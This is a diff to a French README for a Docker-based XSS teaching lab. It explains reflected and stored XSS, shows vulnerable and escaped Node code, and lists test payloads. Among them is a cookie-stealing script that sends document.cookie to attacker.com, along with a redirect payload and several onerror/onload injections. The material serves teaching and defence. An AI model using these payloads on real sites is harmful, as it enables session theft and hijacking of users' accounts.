@@ -92,64 +92,253 @@ document.getElementById('message').innerHTML = location.hash.substring(1);
 
 ## Démarrage
 
-**Windows (PowerShell)** :
+### Prérequis
+
+Avant de commencer, vérifiez que vous avez :
+
+- Docker installé et fonctionnel
+- Docker Compose installé et fonctionnel
+- Un navigateur web moderne (Chrome, Firefox, Edge)
+
+### Vérification de l'installation
+
+#### Windows (PowerShell)
+
 ```powershell
-# Depuis le dossier racine du projet (Cybersecu_Ensitech)
-cd room-4-xss
-docker-compose up -d
+# 1. Vérifier Docker
+docker --version
+# Résultat attendu : Docker version 20.10.x ou supérieur
+
+# 2. Vérifier Docker Compose
+docker-compose --version
+# Résultat attendu : docker-compose version 1.29.x ou supérieur
+
+# 3. Vérifier que Docker fonctionne
+docker ps
+# Résultat attendu : Liste des conteneurs (peut être vide, c'est normal)
 ```
 
-**Mac (Terminal)** :
+**Si vous avez une erreur :**
+
+- Docker n'est pas installé : Téléchargez Docker Desktop depuis https://www.docker.com/products/docker-desktop
+- Docker n'est pas démarré : Lancez Docker Desktop depuis le menu Démarrer
+
+#### Mac (Terminal)
+
 ```bash
-# Depuis le dossier racine du projet (Cybersecu_Ensitech)
-cd room-4-xss
-docker-compose up -d
+# 1. Vérifier Docker
+docker --version
+# Résultat attendu : Docker version 20.10.x ou supérieur
+
+# 2. Vérifier Docker Compose
+docker-compose --version
+# Résultat attendu : docker-compose version 1.29.x ou supérieur
+
+# 3. Vérifier que Docker fonctionne
+docker ps
+# Résultat attendu : Liste des conteneurs (peut être vide, c'est normal)
 ```
 
-**Où exécuter** : Depuis le dossier racine du projet (`Cybersecu_Ensitech`)
+**Si vous avez une erreur :**
 
-Application vulnérable : `http://localhost:3004`
-Application sécurisée : `http://localhost:3005`
+- Docker n'est pas installé : Téléchargez Docker Desktop depuis https://www.docker.com/products/docker-desktop
+- Docker n'est pas démarré : Lancez Docker Desktop depuis Applications
+
+#### Linux (Terminal)
+
+```bash
+# 1. Vérifier Docker
+docker --version
+# Résultat attendu : Docker version 20.10.x ou supérieur
+
+# 2. Vérifier Docker Compose
+docker-compose --version
+# Résultat attendu : docker-compose version 1.29.x ou supérieur
+
+# 3. Vérifier que Docker fonctionne
+docker ps
+# Résultat attendu : Liste des conteneurs (peut être vide, c'est normal)
+```
+
+**Si vous avez une erreur :**
+
+Installez Docker en suivant les instructions officielles : https://docs.docker.com/get-docker/
+
+### Lancer l'environnement vulnérable
+
+**Explication :** Nous allons lancer l'application vulnérable pour voir les problèmes en action avant de les corriger.
+
+#### Windows (PowerShell)
+
+```powershell
+# 1. Ouvrez PowerShell
+# 2. Naviguez vers le dossier de la room
+cd C:\Users\VotreNom\Desktop\Cybersecu_Ensitech\room-4-xss
+
+# 3. Lancez Docker Compose
+docker-compose up -d
+
+# 4. Vérifiez que ça fonctionne
+docker-compose ps
+# Vous devriez voir deux conteneurs : room4-xss-vulnerable et room4-xss-secured
+```
+
+**Que fait cette commande ?**
+
+- `docker-compose up -d` : Lance les conteneurs Docker en arrière-plan
+- `-d` signifie "detached" (détaché) : les conteneurs tournent en arrière-plan
+- Les deux applications (vulnérable et sécurisée) démarrent automatiquement
+
+#### Mac (Terminal)
+
+```bash
+# 1. Ouvrez Terminal
+# 2. Naviguez vers le dossier de la room
+cd ~/Desktop/Cybersecu_Ensitech/room-4-xss
+
+# 3. Lancez Docker Compose
+docker-compose up -d
+
+# 4. Vérifiez que ça fonctionne
+docker-compose ps
+# Vous devriez voir deux conteneurs : room4-xss-vulnerable et room4-xss-secured
+```
+
+#### Linux (Terminal)
+
+```bash
+# 1. Ouvrez Terminal
+# 2. Naviguez vers le dossier de la room
+cd ~/Desktop/Cybersecu_Ensitech/room-4-xss
+
+# 3. Lancez Docker Compose
+docker-compose up -d
+
+# 4. Vérifiez que ça fonctionne
+docker-compose ps
+# Vous devriez voir deux conteneurs : room4-xss-vulnerable et room4-xss-secured
+```
+
+**Vérification :**
+
+Ouvrez votre navigateur et allez sur :
+- `http://localhost:3004` → Application vulnérable
+- `http://localhost:3005` → Application sécurisée
+
+**Si ça ne fonctionne pas :**
+
+- Vérifiez les logs : `docker-compose logs`
+- Vérifiez que les ports 3004 et 3005 ne sont pas déjà utilisés
+- Assurez-vous que Docker Desktop est lancé
 
 ## Analyse du code vulnérable
 
+### Où se trouve le code ?
+
+Le code vulnérable se trouve dans `/src-vulnerable/`
+
 ### Problème principal : Affichage non échappé
+
+**Définition de l'échappement**
+
+L'échappement HTML consiste à remplacer les caractères spéciaux HTML par leurs équivalents encodés pour qu'ils soient affichés comme du texte et non interprétés comme du code.
+
+**Exemple de code vulnérable**
 
 ```javascript
 // VULNÉRABLE
-app.get('/comment', (req, res) => {
-    const comment = req.query.comment;
-    res.send(`<div>${comment}</div>`); // Injection directe !
+app.get('/search', (req, res) => {
+    const query = req.query.q || '';
+    // PROBLÈME : Injection directe sans échappement
+    res.send(`<div>Résultats pour : ${query}</div>`);
 });
 ```
 
-**Impact** : Un attaquant peut injecter du JavaScript qui s'exécutera dans le navigateur des autres utilisateurs.
+**Comment ça marche (pourquoi c'est vulnérable) ?**
+
+1. L'utilisateur entre : `<script>alert('XSS')</script>` dans le champ de recherche
+2. Le serveur reçoit cette valeur dans `req.query.q`
+3. Le serveur envoie directement cette valeur dans le HTML : `<div>Résultats pour : <script>alert('XSS')</script></div>`
+4. Le navigateur reçoit ce HTML
+5. Le navigateur interprète le `<script>` comme du code JavaScript et l'exécute
+6. Résultat : Le script s'exécute dans le navigateur de l'utilisateur
+
+**Pourquoi c'est dangereux ?**
+
+Si au lieu de `alert('XSS')`, l'attaquant injecte :
+```javascript
+<script>
+    // Voler le cookie de session
+    document.location='http://attacker.com/steal?cookie='+document.cookie
+</script>
+```
+Le cookie de session sera envoyé à l'attaquant, qui pourra se connecter à la place de la victime.
 
 ## Version sécurisée
 
-### Solution 1 : Échappement HTML
+### Où se trouve le code ?
+
+Le code sécurisé se trouve dans `/src-secured/`
+
+### Solution : Échappement HTML
+
+**Définition**
+
+L'échappement HTML transforme les caractères spéciaux en entités HTML pour qu'ils soient affichés comme du texte.
+
+**Exemple de code sécurisé**
 
 ```javascript
 // SÉCURISÉ
-const escapeHtml = (text) => {
+function escapeHtml(text) {
     const map = {
-        '&': '&amp;',
-        '<': '&lt;',
-        '>': '&gt;',
-        '"': '&quot;',
-        "'": '&#039;'
+        '&': '&amp;',   // & devient &amp;
+        '<': '&lt;',    // < devient &lt;
+        '>': '&gt;',    // > devient &gt;
+        '"': '&quot;',  // " devient &quot;
+        "'": '&#039;'   // ' devient &#039;
     };
     return text.replace(/[&<>"']/g, m => map[m]);
-};
+}
 
-res.send(`<div>${escapeHtml(comment)}</div>`);
+app.get('/search', (req, res) => {
+    const query = req.query.q || '';
+    // SOLUTION : Échappement avant affichage
+    const safeQuery = escapeHtml(query);
+    res.send(`<div>Résultats pour : ${safeQuery}</div>`);
+});
 ```
 
-### Solution 2 : Utiliser un template engine sécurisé
+**Comment ça marche (pourquoi c'est sécurisé) ?**
+
+1. L'utilisateur entre : `<script>alert('XSS')</script>`
+2. Le serveur reçoit cette valeur
+3. La fonction `escapeHtml()` transforme :
+   - `<` → `&lt;`
+   - `>` → `&gt;`
+   - Résultat : `&lt;script&gt;alert('XSS')&lt;/script&gt;`
+4. Le serveur envoie : `<div>Résultats pour : &lt;script&gt;alert('XSS')&lt;/script&gt;</div>`
+5. Le navigateur reçoit ce HTML
+6. Le navigateur affiche `&lt;script&gt;` comme du texte, pas comme du code
+7. Résultat : Le script ne s'exécute pas !
+
+**Table de correspondance**
+
+| Caractère | Entité HTML | Pourquoi |
+|-----------|-------------|----------|
+| `<` | `&lt;` | Début de balise HTML |
+| `>` | `&gt;` | Fin de balise HTML |
+| `&` | `&amp;` | Début d'entité HTML |
+| `"` | `&quot;` | Guillemets dans attributs |
+| `'` | `&#039;` | Apostrophe |
+
+### Autres solutions
+
+**Solution 2 : Utiliser un template engine sécurisé**
 
 Les frameworks modernes (React, Vue, etc.) échappent automatiquement par défaut.
 
-### Solution 3 : Content Security Policy (CSP)
+**Solution 3 : Content Security Policy (CSP)**
 
 ```javascript
 app.use((req, res, next) => {
@@ -157,6 +346,8 @@ app.use((req, res, next) => {
     next();
 });
 ```
+
+La CSP est une couche de défense supplémentaire qui empêche l'exécution de scripts non autorisés.
 
 ## Ressources pédagogiques
 
@@ -243,6 +434,189 @@ Expliquez :
 - Ce que vous essayez de faire
 - Le problème que vous rencontrez
 - Ce que vous avez déjà essayé
+
+## Tests à effectuer
+
+### Test 1 : XSS Réfléchi
+
+**Objectif :** Tester l'injection XSS dans la recherche
+
+**Étapes :**
+
+1. Allez sur `http://localhost:3004`
+2. Dans le champ de recherche, entrez : `<script>alert('XSS')</script>`
+3. Cliquez sur "Rechercher"
+
+**Résultat attendu (vulnérable) :**
+
+- Une alerte JavaScript s'affiche
+- Cela prouve que le code s'exécute
+
+**Résultat attendu (sécurisé) :**
+
+- Le texte `<script>alert('XSS')</script>` s'affiche comme du texte
+- Aucune alerte ne s'affiche
+
+---
+
+### Test 2 : XSS Stocké
+
+**Objectif :** Tester l'injection XSS dans les commentaires
+
+**Étapes :**
+
+1. Allez sur `http://localhost:3004`
+2. Dans le formulaire de commentaire :
+   - Nom : `Test`
+   - Commentaire : `<img src=x onerror=alert('XSS')>`
+3. Cliquez sur "Publier"
+4. Rechargez la page
+
+**Résultat attendu (vulnérable) :**
+
+- Une alerte JavaScript s'affiche à chaque chargement de page
+- Cela prouve que le code est stocké et exécuté
+
+**Résultat attendu (sécurisé) :**
+
+- Le texte `<img src=x onerror=alert('XSS')>` s'affiche comme du texte
+- Aucune alerte ne s'affiche
+
+---
+
+## Exemples de payloads XSS à tester
+
+**Note importante :** Ces tests sont pour l'apprentissage uniquement. Ne les utilisez jamais sur des sites réels sans autorisation.
+
+### Payloads basiques
+
+**Test 1 : XSS avec script**
+```
+<script>alert('XSS')</script>
+```
+**Explication :** Le payload le plus simple. Si une alerte s'affiche, il y a un XSS.
+
+**Test 2 : XSS avec image**
+```
+<img src=x onerror=alert('XSS')>
+```
+**Explication :** Utilise l'événement `onerror` d'une image. Si l'image ne peut pas charger, le script s'exécute.
+
+**Test 3 : XSS avec SVG**
+```
+<svg onload=alert('XSS')>
+```
+**Explication :** Utilise l'événement `onload` d'un élément SVG.
+
+**Test 4 : XSS avec événement de souris**
+```
+<div onmouseover=alert('XSS')>Survolez-moi</div>
+```
+**Explication :** Le script s'exécute quand vous survolez l'élément avec la souris.
+
+### Payloads avancés (pour comprendre)
+
+**Test 5 : Vol de cookie (simulation)**
+```
+<script>alert(document.cookie)</script>
+```
+**Explication :** Affiche les cookies de session. Dans une vraie attaque, un attaquant pourrait envoyer ces cookies à son serveur.
+
+**Test 6 : Redirection**
+```
+<script>document.location='http://attacker.com'</script>
+```
+**Explication :** Redirige vers un site malveillant. Ne testez pas cela, cela pourrait vous rediriger.
+
+**Test 7 : XSS avec encodage**
+```
+%3Cscript%3Ealert('XSS')%3C/script%3E
+```
+**Explication :** Version encodée URL. Certaines applications décodent automatiquement.
+
+### Comment tester ces payloads
+
+1. **Dans le champ de recherche :**
+   - Copiez un payload
+   - Collez-le dans le champ de recherche
+   - Cliquez sur "Rechercher"
+   - Observez le résultat
+
+2. **Dans les commentaires :**
+   - Copiez un payload
+   - Collez-le dans le champ commentaire
+   - Publiez
+   - Rechargez la page
+   - Observez le résultat
+
+### Ce qu'il faut observer
+
+**Si l'application est vulnérable :**
+- Une alerte JavaScript s'affiche
+- Le code s'exécute dans le navigateur
+- Les cookies peuvent être volés
+- Le contenu de la page peut être modifié
+
+**Si l'application est sécurisée :**
+- Le texte s'affiche tel quel (échappé)
+- Aucune alerte ne s'affiche
+- Le code ne s'exécute pas
+- Les caractères spéciaux sont transformés (ex: `<` devient `&lt;`)
+
+### Pourquoi tester plusieurs payloads ?
+
+Différents payloads fonctionnent dans différents contextes :
+- Certains filtres bloquent `<script>` mais pas `<img>`
+- Certains contextes nécessitent des événements HTML
+- Certaines applications décodent l'URL automatiquement
+
+Tester plusieurs payloads vous aide à comprendre comment les filtres fonctionnent (ou ne fonctionnent pas).
+
+---
+
+## Arrêter l'environnement
+
+Quand vous avez terminé, arrêtez les conteneurs :
+
+```bash
+# Depuis le dossier room-4-xss
+docker-compose down
+```
+
+**Que fait cette commande ?**
+
+- Arrête tous les conteneurs de cette room
+- Libère les ports utilisés
+- Nettoie les ressources Docker
+
+---
+
+## Questions fréquentes
+
+**Q : Pourquoi utiliser Docker ?**
+
+R : Docker permet d'avoir un environnement identique sur Windows, Mac et Linux, sans avoir à installer Node.js, npm, etc. C'est plus simple pour les débutants.
+
+**Q : Je ne comprends pas l'échappement HTML**
+
+R : Imaginez que vous voulez afficher le texte `<script>` sur une page web. Si vous l'écrivez tel quel dans le HTML, le navigateur va l'interpréter comme une balise. L'échappement transforme `<script>` en `&lt;script&gt;` pour que le navigateur l'affiche comme du texte.
+
+**Q : Est-ce que la validation suffit ?**
+
+R : Non ! La validation vérifie que les données sont correctes, mais elle ne protège pas contre le XSS. Il faut toujours échapper les données avant de les afficher.
+
+---
+
+## Glossaire
+
+- **XSS (Cross-Site Scripting)** : Injection de code JavaScript malveillant dans une page web
+- **Échappement HTML** : Transformation des caractères spéciaux en entités HTML
+- **DOM (Document Object Model)** : Représentation de la structure HTML en JavaScript
+- **Réfléchi** : XSS où le code est reflété immédiatement dans la réponse
+- **Stocké** : XSS où le code est stocké dans la base de données
+- **DOM-based** : XSS où le code modifie le DOM côté client
+
+---
 
 ## Prochaines étapes
 
